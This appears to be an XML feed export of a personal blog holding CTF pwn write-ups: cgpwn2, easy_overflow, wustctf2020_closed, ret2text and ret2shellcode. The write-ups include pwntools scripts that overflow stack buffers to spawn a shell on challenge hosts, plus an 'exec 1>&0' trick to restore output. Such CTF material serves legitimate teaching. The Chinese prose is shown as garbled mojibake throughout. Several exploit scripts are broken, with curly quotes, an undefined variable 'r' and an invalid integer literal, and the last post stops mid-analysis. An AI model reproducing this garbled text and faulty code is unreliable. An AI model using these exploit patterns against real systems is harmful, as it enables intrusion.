<h3 id="0x05-questions"><a href="#0x05-questions" class="headerlink" title="0x05 questions"></a>0x05 questions</h3><p>ä¹Ÿå¯ä»¥ç›´æ¥è¿”å›systemå‡½æ•°å‹å‚çš„åœ°å€0x0804860A(ä¹Ÿå°±æ˜¯ call    _systemå¤„çš„åœ°å€)è€Œä¸è¿”å›å‡½æ•°çš„ plt å¤„ï¼Œ<br>ä½†æ˜¯32ä½ä¸€èˆ¬è¿”å›pltå¤„åœ°å€åå…ˆè·Ÿå‡½æ•°è¿”å›åœ°å€ï¼ˆè™šæ‹Ÿçš„ï¼‰å†æ¥å‚æ•°<br>ä¸€ä¸ªpltè¡¨å’Œgotè¡¨çš„<a href="https://detlfy-github-io-s.atrust.sdu.edu.cn:81/2021/09/29/Linux%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E4%B8%8E%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E6%9C%BA%E5%88%B6/">æ•™å­¦æ–‡ç« </a></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>ctf-wiki</tag>
      </tags>
  </entry>
  <entry>
    <title>week2 T5</title>
    <url>/posts/46e9d6ae/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T5-cgpwn2"><a href="#T5-cgpwn2" class="headerlink" title="T5 cgpwn2"></a>T5 cgpwn2</h2><blockquote>
<p>2023-01-09WP<br>æ”»é˜²ä¸–ç•Œ pwné¢˜</p>
</blockquote>
<span id="more"></span>

<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file checksecâ€”â€”32-bitï¼Œå¼€å¯NXä¿æŠ¤</p>
<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDAä¸­æ‰“å¼€windowå‘ç°è¿™é¢˜åˆæ˜¯ä¸€ä¸ªæ‰¾ä¸åˆ°&#x2F;bin&#x2F;shçš„<br>ä½†æ˜¯åœ¨pwnå‡½æ•°ä¸­è¿˜æ˜¯æ‰¾åˆ°äº†systemå‡½æ•°çš„<br><img data-src="https://pic4.zhimg.com/80/v2-068880d6f0f1427b812cd98bee561577_1440w.webp"><br>ç„¶åæˆ‘ä»¬æ¥çœ‹helloå‡½æ•°çš„åæ±‡ç¼–ä»£ç <br><img data-src="https://pic4.zhimg.com/80/v2-c5dd01b36ac83fcdc19cf8ed3f804d0b_1440w.webp"><br>å¥½åƒæœ‰ç‚¹å¤æ‚ï¼Œç®€å•æ¥è¯´å°±æ˜¯å‰é¢å…ˆå®šä¹‰äº†ä¸€å †å˜é‡ï¼Œç„¶åæ¡ä»¶åˆ¤æ–­å…ˆä¸çœ‹äº†å…ˆçœ‹åé¢çš„<br>é¦–å…ˆè¦æ±‚æˆ‘ä»¬è¾“å…¥ä¸€ä¸ªåå­—ï¼Œé€šè¿‡fgetså‡½æ•°å®Œæˆï¼Œå¹¶ä¸”ä»é”®ç›˜æœ€å¤šåªèƒ½è¯»å–32hä¸ªå­—ç¬¦åˆ°name<br>ç„¶åå†é€šè¿‡getså‡½æ•°ä»é”®ç›˜è¯»å–å­—ç¬¦åˆ°såŒºåŸŸï¼Œæ²¡æœ‰è¾“å…¥å­—ç¬¦æ•°é‡çš„é™åˆ¶<br>å…¶ä¸­nameæ˜¯bssæ®µçš„ä¸€ä¸ªå¤§å°ä¸º34çš„åŒºåŸŸï¼Œ<br><img data-src="https://pic3.zhimg.com/80/v2-a6b3d88fcbe601a724cad07d655b85f6_1440w.webp"><br>sæ˜¯é•¿åº¦ä¸º0x26ä¸ªå­—èŠ‚çš„åŒºåŸŸ<br><img data-src="https://pic1.zhimg.com/80/v2-a33446043ab1e9de86ee374db4c9dd28_1440w.webp"><br>äºæ˜¯æˆ‘ä»¬å¯ä»¥å‘nameåŒºåŸŸè¾“å…¥&#x2F;bin&#x2F;sh,ç„¶åè®©è¿™ä¸ªåœ°å€ä½œä¸ºsystemå‡½æ•°çš„å‚æ•°ï¼Œè€Œsåˆ™ç”¨æ¥è¿›è¡Œæ ˆæº¢å‡ºï¼Œå¹¶è®©æº¢å‡ºçš„è¿”å›åœ°å€ä¸ºsystemå‡½æ•°çš„åœ°å€</p>
<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(â€™61.147.171.105â€˜ï¼Œ51582)</span><br><span class="line">target = 0x804855A</span><br><span class="line">binsh = 0x804A080</span><br><span class="line">payload = b&#x27;a&#x27; * 0x26 +b &#x27;bbbb&#x27; #è¦†ç›–så’Œebpçš„æ•°æ®</span><br><span class="line">                 + p32(target) + p32(binsh)#è¿”å›getså‡½æ•°çš„åœ°å€å’Œå‚æ•°</span><br><span class="line">a = r.recvuntil(&#x27;e\n&#x27;)</span><br><span class="line">p.sendline(&#x27;/bin/sh&#x27;)#å‘fgetå‡½æ•°å‘é€å­—ç¬¦ä¸²</span><br><span class="line">a = r.recvuntil(&#x27;:\n&#x27;)#ç­‰å¾…æ¥å—åˆ°æ‹¬å·å†…çš„ä¿¡æ¯åå†è¿è¡Œä¸‹é¢çš„å†…å®¹</span><br><span class="line">p.sendline(payload)#å‘é€payload</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>å¥½åƒä¸è¦a &#x3D; r.recvuntil(â€˜e\nâ€™)ï¼Œa &#x3D; r.recvuntil(â€˜:\nâ€™)ä¹Ÿå¯ä»¥â€¦â€¦</p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>æ”»é˜²ä¸–ç•Œ</tag>
      </tags>
  </entry>
  <entry>
    <title>week3 T1</title>
    <url>/posts/f93875d2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T1-easy-overflow"><a href="#T1-easy-overflow" class="headerlink" title="T1 easy_overflow"></a>T1 easy_overflow</h2><blockquote>
<p>2023-01-14WP<br>Hgame week1 pwn ç¬¬äºŒé¢˜<br>è€ƒç‚¹ï¼šç®€å•æ ˆæº¢å‡º</p>
</blockquote>
<span id="more"></span>

<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p><strong>file</strong>â€”â€”64-bit,<br><strong>checksec</strong> å¼€å¯NX<br><img data-src="https://picx.zhimg.com/80/v2-b02ac7a02df1467f41fa6b8ed8ecf147_1440w.png?source=d16d100b"></p>
<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p><strong>IDA</strong>çœ‹æºç ï¼Œå…ˆæ‰¾&#x2F;bin&#x2F;shï¼Œä¸€è·¯ç´¢å¼•è¿‡å»å‘ç°åœ¨ä¸€ä¸ªåé—¨å‡½æ•°ä¸­</p>
<p><img data-src="https://picx.zhimg.com/80/v2-9e559b87dc3591a21383567579e57aec_1440w.png?source=d16d100b"></p>
<p><img data-src="https://pic1.zhimg.com/80/v2-6c43653aae10a9334f6d4a773827dcae_1440w.png?source=d16d100b"></p>
<p>ç„¶åæˆ‘çš„ç¬¬ä¸€ååº”æ˜¯å…ˆè®°ä¸‹call systemçš„åœ°å€ï¼Œç»“æœä¸€çœ‹ï¼Œæ²¡æ‰¾åˆ°ï¼Ÿå–è€Œä»£ä¹‹çš„æ˜¯call    sub_401060<br>äºæ˜¯æˆ‘å¡äº†ä¸€ä¸‹ï¼Œå¯èƒ½æ˜¯ç¬¬ä¸€æ¬¡ç¢°åˆ°è¿™æ ·çš„é¢˜çš„ç¼˜æ•…ï¼Œæˆ‘æ²¡æœ‰æ„è¯†åˆ°å‡½æ•°åç§°å¯ä»¥æ˜¯ä¸ä¸€æ ·çš„<br>æ‰“å¼€mainå‡½æ•°ä¼ªä»£ç ä¹Ÿæ˜¯è¿™æ ·â€¦â€¦<br><img data-src="https://pic1.zhimg.com/80/v2-d944638581f5f4e8ed3bb1f91435d464_1440w.webp"><br>è¶Šçœ‹è¶Šä¸å¯¹åŠ²ï¼Œæœç´¢èµ„æ–™æ‰å‘ç°è¿™ç§é¢˜çš„é£æ ¼å°±æ˜¯å»ç¬¦å·ä½¿åŸå‡½æ•°åå­—æ— æ³•æ˜¾ç¤º<br>è¿™ä¹ˆè¯´IDAæ— æ³•è§£å†³äº†</p>
<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>æˆ‘ä»¬è½¬è€ŒåŠ¨æ€è°ƒè¯•è¯•ä¸€ä¸‹<br>æˆ‘ä»¬å‡è®¾æ–‡ä»¶å¸¦æœ‰systemå‡½æ•°ï¼Œåˆæ®é¢˜æ„åº”è¯¥æ˜¯æœ‰getsæˆ–è€…readä¹‹ç±»çš„å‡½æ•°çš„<br>è¿è¡Œæ–‡ä»¶æµ‹è¯•ä¸€ä¸‹ç¡®å®å¦‚æ­¤<br><img data-src="https://pic1.zhimg.com/80/v2-c0c3d1d2b64d886ff2b0c795be14315c_1440w.webp"><br>é‚£ä¹ˆæˆ‘ä»¬åœ¨è¿™å‡ ä¸ªå‡½æ•°å¤„è¯•ç€æ‰“æ–­ç‚¹<br><img data-src="https://pic3.zhimg.com/80/v2-ff2f8659b478bef6651b656f3a5ee762_1440w.webp"><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå…¶ä¸­systemçš„åœ°å€å’Œåé¢å‡½æ•°ä¸­çš„call    sub_401060çš„pltå¤„åœ°å€å¯¹ä¸Šäº†<br>readå‡½æ•°çš„åœ°å€å’Œmainå‡½æ•°ä¸­çš„ call    sub_401080çš„pltå¤„åœ°å€å¯¹ä¸Šäº†<br>åŒæ—¶å‘¢ï¼Œgdbè¿è¡Œæ–‡ä»¶çš„æ—¶å€™è¿˜å‘ç°mainå‡½æ•°ä¸­è¿˜æœ‰ä¸€ä¸ªcloseå‡½æ•°ï¼Œæµè§ˆä¸€ä¸‹mainå‡½æ•°æºç åªæœ‰sub_401070äº†<br><img data-src="https://pic2.zhimg.com/80/v2-4d7a5a5c48c6c578df4ef9f351eac149_1440w.webp"><br><img data-src="https://pic2.zhimg.com/80/v2-8553dc620b792d521995f7e5718e1629_1440w.webp"><br>æŸ¥é˜…äº†ä¸€äº›èµ„æ–™å¾—çŸ¥ï¼Œclose(1)å…³é—­äº†æ ‡å‡†è¾“å‡ºï¼Œè¯¦ç»†è§è¿™ç¯‡<a href="https://blog.csdn.net/xirenwang/article/details/104139866">æ–‡ç« </a><br>ä¹Ÿå°±æ˜¯æœ‰ä¸‹é¢æˆ‘ä»¬å¾—åˆ°shellåæ— æ³•åœ¨å±å¹•ä¸Šçœ‹åˆ°flagçš„æƒ…å†µ<br>è¿™æ—¶å€™å°±è¦è¾“å…¥exec 1&gt;&amp;0é‡å¯æ ‡å‡†è¾“å‡º<br>é‚£ä¹ˆç°åœ¨å‘¢æˆ‘ä»¬å·²ç»æŠŠæ–‡ä»¶é‡Œçš„å‡ ä¸ªä¸»è¦å‡½æ•°åˆ†æå¥½äº†ï¼Œæ¥ä¸‹æ¥å°±è¦æ‰¾åç§»é‡äº†</p>
<h3 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h3><p>è¿™ä¸€éƒ¨åˆ†æˆ‘å‘ç°ä¸€ä¸ªå¾ˆå‘çš„åœ°æ–¹ï¼Œå¦‚æœæˆ‘ä»¬ç”¨ctf-wilkiä¸Šçš„æ–¹æ³•ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨gdbè°ƒè¯•è®¾æ–­ç‚¹çš„æ—¶å€™å°±ä¸èƒ½è®¾ </p>
<blockquote>
<p>b read</p>
</blockquote>
<p>è¿™æ ·è®¾çš„è¯æˆ‘ä»¬ç›´æ¥å°±è¿›å…¥åˆ°readå‡½æ•°é‡Œäº†ï¼Œé‚£å°±æ— æ³•çœ‹åˆ°å‚¨å­˜æ•°æ®çš„å¯„å­˜å™¨ï¼ˆä¸ç®¡æ˜¯ä»€ä¹ˆï¼‰è·rspæˆ–è€…rbpçš„åç§»äº†<br>å¹¶ä¸”ï¼Œæ­¤æ—¶å·²ç»å¼€å§‹è¿›å…¥readå­å‡½æ•°ï¼Œå³å·²ç»åˆ†é…äº†æ–°çš„æ ˆå¸§äº†ï¼Œrspå·²ç»ç§»åŠ¨ï¼Œå†å»è®¡ç®—rspå’Œrbpçš„å·®å€¼åˆ™ä¼šä¸å‡†ç¡®</p>
<blockquote>
<p>b  *0x4011be</p>
</blockquote>
<p>æˆ‘ä»¬åº”è¯¥è¿™æ ·è®¾æ–­ç‚¹ï¼Œè¿™æ ·å°±åœæ­¢åœ¨è¿›å…¥readå‡½æ•°ä¹‹å‰ï¼Œä¸ä»…å¯ä»¥çœ‹åˆ°ç›¸å¯¹åç§»,è¿˜èƒ½è®¡ç®—å‡ºrbp-rsp<br><img data-src="https://pic3.zhimg.com/80/v2-9efe6dca6df2fee543e1ebc2027b17de_1440w.webp"><br><img data-src="https://pic1.zhimg.com/80/v2-0d752265119152e7f608595ea4255d90_1440w.webp"><br>å¾—å‡ºrspå’Œrsi 0x7fffffffddd0,rbpä¸º0x7fffffffdde0,è®¡ç®—å¾—è·rbpåç§»é‡å°±ä¸º0x7fffffffdde0-0x7fffffffddd0<br>é‚£ä¹ˆå†åŠ ä¸Šrbpæ±‚å¾—ä¸º0x10+8</p>
<p>è¿˜å¯ä»¥æš´åŠ›æ±‚å¾—  <del>æ‡’å¾—è®¡ç®—åç§»é‡çš„è¯</del><br><img data-src="https://pic4.zhimg.com/80/v2-c7ec27fdfb682541c8a7d2aeb8e4c663_1440w.webp"></p>
<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>å¯ä»¥å†™exp</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;week-1.hgame.lwsec.cn&quot;</span>, <span class="number">30574</span>)</span><br><span class="line"></span><br><span class="line">system_addr = 000000000401176</span><br><span class="line">payload = b <span class="string">&#x27; a &#x27;</span> * <span class="number">0x18</span> + p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>å¥½å¥‡æ€ªä¸ºä»€ä¹ˆå®˜æ–¹çš„WPå¯ä»¥ç›´æ¥åæ±‡ç¼–æˆæ­£å¸¸çš„å‡½æ•°ï¼Ÿ<br>æœäº†ä¸€ä¸‹å¥½åƒå¯ä»¥æ‰‹åŠ¨æ·»åŠ æ ‡ç­¾,<a href="https://blog.csdn.net/Breeze_CAT/article/details/103788796">è¿™ç¯‡æ–‡ç« </a>æ•™äº†ä¸€ä¸‹è¿™ä¹ˆå›å¤åº“å‡½æ•°åï¼Œä½†æ˜¯çœ‹ä¸æ‡‚â€¦â€¦</p>
<h3 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h3><p><img data-src="https://pic4.zhimg.com/80/v2-23c72811fac836cd0c8980516e1acc83_1440w.webp"><br>å¾—åˆ°shellåå‘ç°å¹¶æ²¡æœ‰åŠæ³•æ˜¾ç¤ºå‡ºflagï¼Œé—®é¢˜å°±åœ¨ä¹‹å‰çš„é‚£ä¸ªclose(1)å› ä¸ºæ±‡ç¼–ä»£ç ä¸­æœ‰è¿™æ ·ä¸€å¥</p>
<blockquote>
<p>mov     edi, 1</p>
</blockquote>
<p>æ‰€ä»¥è®¤ä¸ºclose()æ‹¬å·é‡Œçš„å‚æ•°æ—¶1<br>è¿™æ—¶å€™éœ€è¦ä½¿ç”¨å‘½ä»¤è®©shellèƒ½å¤Ÿæ­£å¸¸å›æ˜¾</p>
<blockquote>
<p>exec 1&gt;&amp;0</p>
</blockquote>
<p>ç´¯æ­»äº†ï¼Œç»ˆäºæ‹¿åˆ°flag<br><img data-src="https://pic2.zhimg.com/80/v2-ee060de7086e6945edf7fda074674fa5_1440w.webp"></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>hgame</tag>
      </tags>
  </entry>
  <entry>
    <title>week3 T2</title>
    <url>/posts/60312468/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T2-wustctf2020-closed"><a href="#T2-wustctf2020-closed" class="headerlink" title="T2 wustctf2020_closed"></a>T2 wustctf2020_closed</h2><blockquote>
<p>2023-01-15WP<br>BUUCTF  pwn<br>è€ƒç‚¹ï¼šcloseå‡½æ•°</p>
</blockquote>
<span id="more"></span>

<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>åšäº†hgameçš„ç¬¬äºŒé¢˜åï¼Œå»è¡¥å……äº†ä¸€ä¸‹å…³äºcloseå‡½æ•°çš„çŸ¥è¯†ï¼Œå†ä»BUUCTFä¸­æ‰¾äº†ä¸€é¢˜ç»ƒäº†ç»ƒ<br>å…ˆfileçŸ¥é“æ—¶64-bit</p>
<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>è¿™ä¸€é¢˜ç»“æ„å¾ˆç®€å•ï¼Œå†IDAä¸­ç›´æ¥èƒ½æ‰¾åˆ°åœ¨mainå‡½æ•°ä¸­çš„vulnerableå‡½æ•°ä¸­return shellå‡½æ•°ä¸­æœ‰systemå‡½æ•°<br>ç›´æ¥ç»™å¥½äº†<br><img data-src="https://pic2.zhimg.com/80/v2-bd22be15351c97aebae2de7f1bd0f4bd_1440w.webp"><br><img data-src="https://pic3.zhimg.com/80/v2-640c1ebbaa31c9a5013bd8feafceaee6_1440w.webp"><br><img data-src="https://pic4.zhimg.com/80/v2-2c7eb0afee1a164507dd332cf37e7813_1440w.webp"></p>
<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>ä½†æ˜¯å› ä¸º</p>
<blockquote>
<p>close(1)<br>  close(2)</p>
</blockquote>
<p>å°†æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯è¾“å‡ºå…³é—­äº†ï¼Œè¿™æ ·åœ¨çª—å£ä¸Šçœ‹ä¸åˆ°è¾“å‡º<br>è¿™æ—¶å€™å°±éœ€è¦æˆ‘ä»¬é‡æ–°å®šä½æ ‡å‡†è¾“å‡º</p>
<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p><strong>è¡¥å……ä¸€äº›çŸ¥è¯†</strong></p>
<ul>
<li><p>åœ¨Linuxä¸­çš„æ–‡ä»¶ï¼Œæ–‡ä»¶æè¿°ç¬¦ï¼ˆfile descriptorï¼‰æ˜¯å†…æ ¸ä¸ºäº†é«˜æ•ˆç®¡ç†å·²è¢«æ‰“å¼€çš„æ–‡ä»¶æ‰€åˆ›å»ºçš„ç´¢å¼•ï¼Œæ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ï¼ˆé€šå¸¸æ˜¯å°æ•´æ•°ï¼‰ï¼Œç”¨äºæŒ‡ä»£è¢«æ‰“å¼€çš„æ–‡ä»¶ï¼Œæ‰€æœ‰æ‰§è¡ŒI&#x2F;Oæ“ä½œçš„ç³»ç»Ÿè°ƒç”¨éƒ½é€šè¿‡æ–‡ä»¶æè¿°ç¬¦ã€‚ç¨‹åºåˆšåˆšå¯åŠ¨çš„æ—¶å€™ï¼Œ0æ˜¯æ ‡å‡†è¾“å…¥ï¼Œ1æ˜¯æ ‡å‡†è¾“å‡ºï¼Œ2æ˜¯æ ‡å‡†é”™è¯¯ã€‚å¦‚æœæ­¤æ—¶å»æ‰“å¼€ä¸€ä¸ªæ–°çš„æ–‡ä»¶ï¼Œå®ƒçš„æ–‡ä»¶æè¿°ç¬¦ä¼šæ˜¯3ã€‚</p>
</li>
<li><p>æ ‡å‡†è¾“å…¥è¾“å‡ºçš„æŒ‡å‘æ˜¯é»˜è®¤çš„ï¼Œä¹Ÿå°±æ˜¯é»˜è®¤æ‰“å¼€ä¸€ä¸ªç»ˆç«¯åï¼Œ0ï¼Œ1ï¼Œ2éƒ½æŒ‡å‘åŒä¸€ä¸ªä½ç½®ä¹Ÿå°±æ˜¯å½“å‰ç»ˆç«¯ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹å®ƒä»¬çš„æŒ‡å‘ï¼Œä¹Ÿå³é‡å®šä½</p>
</li>
<li><p>æˆ‘ä»¬å¯ä»¥å°†æ ‡å‡†è¾“å‡ºè¿›è¡Œé‡å®šå‘</p>
</li>
<li><p>&amp;+æ–‡ä»¶æè¿°ç¬¦, å¯ä»¥æŒ‡ä»£è¯¥æ–‡ä»¶(è¿›ç¨‹)</p>
</li>
</ul>
<p>ç°åœ¨å¯ä»¥è§£å†³closeå‡½æ•°çš„é—®é¢˜äº†<br>åœ¨åŒä¸€ä¸ªè¿›ç¨‹é‡Œé¢, æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†è¾“å…¥çš„æŒ‡å‘éƒ½æ˜¯ç›¸åŒçš„ç»ˆç«¯. ç”±äºæ ‡å‡†è¾“å…¥æ²¡æœ‰è¢«ç¦ç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å‘½ä»¤</p>
<blockquote>
<p>exec 1&gt;&amp;0</p>
</blockquote>
<p>è®©æ ‡å‡†è¾“å‡ºå®šä½åˆ°æ ‡å‡†è¾“å…¥çš„æ–‡ä»¶ï¼Œä¹Ÿå°±ç›¸å½“äºé‡å¯äº†æ ‡å‡†è¾“å‡º<br>æœ¬è´¨ä¸Šå³exec+é‡å®šå‘å‘½ä»¤ï¼Œåªä¸è¿‡æ“ä½œçš„æ˜¯æ–‡ä»¶æè¿°ç¬¦<br>ç°åœ¨catåˆ°çš„flagå°±èƒ½å¤Ÿè¾“å‡ºäº†<br><img data-src="https://pic3.zhimg.com/80/v2-49e09c530cab090cb5dedbddbd1a8812_1440w.webp"><br><del>å‡ºé¢˜äººå¾ˆæœ‰æ„æ€ï¼Œè¿æ¥ä¸Šç¯å¢ƒç¬¬ä¸€ä»¶äº‹æ˜¯å˜²è®½ä¸€ä¸‹ä½ </del></p>
<p><a href="https://blog.csdn.net/Y_peak/article/details/115406518">å‚è€ƒ</a>    <a href="https://blog.csdn.net/Y_peak/article/details/115406518">æ–‡ç« </a></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>BUUCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>week2 T1</title>
    <url>/posts/418412b7/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T1-ret2text"><a href="#T1-ret2text" class="headerlink" title="T1 ret2text"></a>T1 ret2text</h2><blockquote>
<p>2023-01-09WP<br>ctf-wikiåŸºç¡€rop</p>
</blockquote>
<span id="more"></span>

<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file checksecâ€”â€”32-bitï¼Œ å¼€å¯NX<br><img data-src="https://pic3.zhimg.com/80/v2-20e95bd89f447f1d91529cc30f6128ce_1440w.webp"></p>
<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDAæŸ¥çœ‹ä»£ç ï¼Œå¯ä»¥çœ‹å‡ºmainå‡½æ•°ä¸­æœ‰getså‡½æ•°ï¼Œå­˜åœ¨æ ˆæº¢å‡ºæ¼æ´<br><img data-src="https://pic4.zhimg.com/80/v2-535180f34be67dbe755cf8473706034b_1440w.webp"><br>å‘ç°è¿˜æœ‰æœ‰ä¸€ä¸ªsecureå‡½æ•°è°ƒç”¨äº†system(â€œ&#x2F;bin&#x2F;shâ€)<br><img data-src="https://pic2.zhimg.com/80/v2-fc8a7c446eb25d23f3b1743f1720ec71_1440w.webp"><br>åŒå‡»å­—ç¬¦ä¸²Ctrl+Xï¼Œè®°ä¸‹â€&#x2F;bin&#x2F;shâ€çš„åœ°å€0x0804863A<br>0x0804863Aå°±æ˜¯éœ€è¦è¿”å›çš„åœ°å€</p>
<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>ç”¨gdbè°ƒè¯•<br>åœ¨è°ƒç”¨getså‡½æ•°çš„åœ°å€å¤„0x080486AEè®¾ç½®æ–­ç‚¹<br>r è¿è¡Œå¦‚ä¸‹<br><img data-src="https://pic4.zhimg.com/80/v2-e896b8f6a61789dae7d55da0447d61c3_1440w.webp"><br>å…¶ä¸­ebpä¸º0xffffcff8,espä¸º0xffffcf70,é‚£ä¹ˆsä¸º[esp+0x1c]å³0xffffcf8cï¼Œç›¸å¯¹äºebpçš„åç§»æ˜¯0x6cï¼Œç›¸å¯¹äºè¿”å›åœ°å€çš„åç§»æ˜¯0x6c+4</p>
<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>å†™exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = process(&#x27;./ret2text&#x27;)</span><br><span class="line">target = 0x804863a</span><br><span class="line">sh.sendline(b&#x27;A&#x27; * (0x6c+4) + p32(target))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p><strong>ç–‘é—®ï¼š</strong>æˆ‘æœ‰ä¸€ç‚¹ä¸æ˜ç™½çš„æ˜¯ä¸ºä»€ä¹ˆIDAä¸­çœ‹åˆ°çš„sç›¸å¯¹äºebpçš„åç§»æ˜¯64hï¼Œè€Œgdbè°ƒè¯•å‡ºæ¥çš„æ˜¯0x6c+4<br>ç½‘ä¸Šçœ‹åˆ°æœ‰ä¸€ä¸ªåªç”¨IDAå°±æˆåŠŸåœ°ç®—å‡ºäº†åç§»é‡ï¼Œä½†å¯¹äºæ–‡ç« é‡Œçš„è§£é‡Šå¹¶ä¸æ˜¯å¾ˆç†è§£<br>åªèƒ½è¯´æœ‰æ—¶å€™IDAè¿˜æ˜¯ä¸gdbçš„æœ‰å‡ºå…¥ï¼Œä¸è¿‡è¿˜æ˜¯ä»¥gdbè°ƒè¯•çš„ä¸ºå‡†<br><img data-src="https://pic2.zhimg.com/80/v2-3afcfae075e4dbe213e06287af171919_1440w.webp"></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>ctf-wiki</tag>
      </tags>
  </entry>
  <entry>
    <title>week3 T3</title>
    <url>/posts/173614fe/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T3-ret2shellcode-1-bssæ®µå†™å…¥"><a href="#T3-ret2shellcode-1-bssæ®µå†™å…¥" class="headerlink" title="T3 ret2shellcode 1  (bssæ®µå†™å…¥)"></a>T3 ret2shellcode 1  (bssæ®µå†™å…¥)</h2><blockquote>
<p>2023-01-15WP<br>ctf-wiki pwn<br>è€ƒç‚¹ï¼šæ ˆæº¢å‡º shellcode</p>
</blockquote>
<span id="more"></span>

<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>fileï¼Œchecksec â€”â€” 32bitï¼Œå•¥ä¿æŠ¤éƒ½æ²¡å¼€<br><img data-src="https://pic1.zhimg.com/80/v2-c30ffe5ee07a9e5b5d0f124f011cc634_1440w.webp"></p>
<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDAæŸ¥çœ‹æºç ï¼Œæ²¡æœ‰systemå‡½æ•°å’Œ&#x2F;bin&#x2F;shå­—ç¬¦ä¸²<br>å¹¶ä¸”å¯ä»¥çœ‹åˆ°ï¼Œmainå‡½æ•°ä¸­ï¼Œgetså‡½æ•°è¯»å–ç”¨æˆ·è¾“å…¥åˆ°å˜é‡sï¼Œstrcnpå°†sä¸­çš„å­—ç¬¦ä¸²å¤åˆ¶åˆ°buf2å¤„<br><img data-src="https://pic3.zhimg.com/80/v2-da432353b394322fd2a9113c6042b0c6_1440w.webp"><br>buf2å¹¶æ²¡æœ‰åœ¨mainå‡½æ•°ä¸­çœ‹åˆ°å®šä¹‰ï¼Œåº”è¯¥æ˜¯å…¨å±€å˜é‡ï¼Œè¿›ä¸€æ­¥æŸ¥çœ‹buf2åœ¨bssæ®µä¸­<br><img data-src="https://pic1.zhimg.com/80/v2-96ffdd44e368d33ff3f3def08797ce38_1440w.webp"></p>
